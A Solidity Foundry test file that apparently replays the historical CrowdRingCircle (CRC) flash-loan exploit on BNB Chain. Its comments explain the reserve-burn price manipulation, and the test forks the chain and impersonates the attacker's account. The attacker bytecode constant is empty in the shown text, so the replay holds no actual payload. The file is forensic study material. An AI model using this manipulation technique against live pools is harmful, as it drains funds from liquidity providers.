pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// CrowdRingCircle (CRC) — "sell destroy" reserve-burn price manipulation on BNB Chain
// ~$201K USDT drained from the CRC/USDT PancakeSwap LP.
//
// Exploit tx : 0xeaef22325e02ac65a8e1f2e1a3a43f7b7ac8d2323ce6f698a90813e77017c834 (block 110301524)
//   The tx is a CREATE (empty `to`): the whole flash-loan attack runs inside the attacker
//   contract's constructor. Flash-funded via PancakeSwap Infinity Vault + Venus.
//
// Root cause: CRC's `_update` override has a "sell destroy" path. On any transfer TO a DEX pair it
//   burns CRC straight out of the pair's own balance (`_safeDeductBalance(to, amount)`) then calls
//   `IUniswapV2Pair(to).sync()`. Repeatedly pushing CRC into the LP forces the pair to burn its own
//   reserves and re-sync, skewing the ratio so CRC's price inflates; the attacker then swaps CRC
//   for USDT at the manipulated rate.
//
// CRC token  : 0x8581433150f2C48ff2efE5A22b17c7D405054509
// Victim LP  : 0xd8799A644850c065388C22Df4EE0C28472922526 (CRC/USDT PancakeSwap pair)
// Attacker   : 0x34579eA92a07a88F5505dFaA4D99Ab94b2784087
//
// Forensic replay: the exact creation bytecode is hardcoded below and re-deployed via raw CREATE
// at the historical fork block, pranking the attacker EOA as both msg.sender and tx.origin
// (the constructor guards on the ORIGIN opcode).
//
// Run:
//   forge test --contracts ./src/test/2026-07/CrowdRingCircle_exp.sol -vvv
//   (add `--evm-version cancun` if you hit a frameless [NotActivated] EvmError)
//   Requires an ARCHIVE BSC RPC mapped to the `bsc` rpc alias.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract CrowdRingCircleExp is Test {
    address constant ATTACKER = 0x34579eA92a07a88F5505dFaA4D99Ab94b2784087;
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955; // 18 decimals on BSC
    address constant CRC = 0x8581433150F2c48fF2eFE5A22B17C7d405054509;
    address constant VICTIM_LP = 0xd8799A644850c065388c22DF4eE0C28472922526;

    uint256 constant EXPLOIT_BLOCK = 110_301_524;

    bytes constant CREATION_CODE = hex"";

    function setUp() public {
        // Fork one block before the exploit so the CRC/USDT LP reserves are in their pre-attack state.
        vm.createSelectFork("bsc", EXPLOIT_BLOCK - 1);
        vm.label(ATTACKER, "AttackerEOA");
        vm.label(USDT, "USDT");
        vm.label(CRC, "CRC");
        vm.label(VICTIM_LP, "CRC/USDT_LP");
    }

    function testExploit() public {
        uint256 pre = IERC20(USDT).balanceOf(ATTACKER);
        emit log_named_decimal_uint("Attacker USDT before", pre, 18);

        // Deploy the attacker contract exactly as the real tx did: the constructor runs the whole
        // flash-loan + reserve-burn manipulation and forwards the USDT profit to tx.origin.
        // The real CREATE tx carried 100 wei of value; the constructor wraps it to WBNB and needs
        // exactly that 100-wei seed to top the Venus+Aave redemptions up to the flash-loan repay
        // (Aave returns 35000e18-100 wei of the 35000e18 supplied). Deploy with the same 100 wei.
        vm.deal(ATTACKER, ATTACKER.balance + 100);
        bytes memory code = CREATION_CODE;
        vm.prank(ATTACKER, ATTACKER); // msg.sender AND tx.origin = attacker EOA
        address deployed;
        assembly {
            deployed := create(100, add(code, 0x20), mload(code))
        }
        require(deployed != address(0), "attacker contract deployment failed");

        uint256 post = IERC20(USDT).balanceOf(ATTACKER);
        emit log_named_decimal_uint("Attacker USDT after", post, 18);
        emit log_named_decimal_uint("Profit (USDT)", post - pre, 18);

        // Attacker EOA gains ~201,359 USDT from the manipulated CRC/USDT swap.
        assertApproxEqAbs(post - pre, 201_359 ether, 1_000 ether, "unexpected USDT profit");
    }
}
